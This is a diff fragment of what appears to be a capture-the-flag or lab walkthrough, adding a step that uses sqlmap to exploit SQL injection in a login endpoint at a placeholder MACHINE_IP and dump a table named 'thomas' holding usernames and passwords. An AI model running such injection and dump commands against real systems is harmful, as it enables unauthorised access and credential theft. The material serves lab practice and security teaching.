@@ -284,3 +284,5 @@ Bash
 sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --level=5 -D users --tables
 Step 4: Dump the Data
 After finding an interesting table (e.g., thomas), I specify both the database and the table, then use --dump to extract the records (which often contain usernames and passwords).
+
+sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --level=5 -D users -T thomas --dump****
